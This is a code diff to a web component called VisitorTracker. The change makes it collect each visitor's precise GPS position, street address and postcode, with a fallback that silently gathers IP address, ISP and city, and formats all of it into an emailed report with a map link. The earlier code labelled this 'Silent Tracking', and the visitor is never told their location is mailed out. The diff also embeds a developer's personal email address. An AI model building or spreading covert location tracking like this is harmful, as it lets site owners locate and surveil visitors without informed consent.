@@ -13,7 +13,42 @@ function getEmailJsConfig(contact = DEFAULT_CONTACT) {
   };
 }
 
-/** Fetch IP-based location (silent, city-level, no GPS permission needed). */
+/** Step 1 — Try browser GPS (most accurate). Returns coords or null. */
+function getBrowserCoords() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+      () => resolve(null),          // denied or timed out
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+  });
+}
+
+/** Step 2 — Reverse geocode GPS coords → full address via OpenStreetMap Nominatim (free). */
+async function reverseGeocode(lat, lon) {
+  try {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1&email=aniljiragyale07@gmail.com`;
+    const res = await fetch(url, { headers: { 'Accept-Language': 'en' } });
+    if (!res.ok) return null;
+    const d = await res.json();
+    const a = d.address || {};
+    return {
+      displayName: d.display_name || 'N/A',
+      road: a.road || a.pedestrian || a.footway || a.suburb || '',
+      suburb: a.suburb || a.neighbourhood || a.quarter || '',
+      city: a.city || a.town || a.village || a.county || '',
+      district: a.state_district || a.county || '',
+      state: a.state || '',
+      country: a.country || '',
+      postcode: a.postcode || 'N/A',
+    };
+  } catch {
+    return null;
+  }
+}
+
+/** Step 3 — IP-based fallback (city-level, no GPS permission needed). */
 async function getIpLocation() {
   try {
     const res = await fetch('https://ipapi.co/json/');
@@ -36,6 +71,27 @@ async function getIpLocation() {
 
 /** Build the location section of the email. */
 async function buildLocationString() {
+  // Try GPS first
+  const coords = await getBrowserCoords();
+
+  if (coords) {
+    const geo = await reverseGeocode(coords.lat, coords.lon);
+    if (geo) {
+      const addrParts = [geo.road, geo.suburb, geo.city, geo.district, geo.state, geo.country]
+        .filter(Boolean)
+        .join(', ');
+      return (
+        `📍 GPS LOCATION (High Accuracy ±${Math.round(coords.accuracy)}m)\n` +
+        `   Full Address : ${addrParts}\n` +
+        `   Pincode      : ${geo.postcode}\n` +
+        `   Display Name : ${geo.displayName}\n` +
+        `   Coordinates  : ${coords.lat.toFixed(6)}, ${coords.lon.toFixed(6)}\n` +
+        `   Maps Link    : https://maps.google.com/?q=${coords.lat},${coords.lon}`
+      );
+    }
+  }
+
+  // Fallback to IP
   const ip = await getIpLocation();
   if (ip) {
     const mapsQuery = ip.latitude && ip.longitude
@@ -43,17 +99,17 @@ async function buildLocationString() {
       : `https://maps.google.com/?q=${encodeURIComponent(ip.city + ', ' + ip.country)}`;
 
     return (
-      `📍 LOCATION DETAILS (IP-Based — Silent Tracking)\n` +
+      `📍 IP-BASED LOCATION (Approximate — GPS permission was denied/unavailable)\n` +
       `   City/Region  : ${ip.city}, ${ip.region}\n` +
       `   Country      : ${ip.country}\n` +
-      `   Postal/Pincode: ${ip.postal}\n` +
+      `   Postal Code  : ${ip.postal}\n` +
       `   IP Address   : ${ip.ip}\n` +
       `   ISP          : ${ip.isp}\n` +
       `   Maps Link    : ${mapsQuery}`
     );
   }
 
-  return '📍 Location: Could not be determined (IP lookup failed)';
+  return '📍 Location: Could not be determined (GPS failed + IP lookup failed)';
 }
 
 export default function VisitorTracker() {
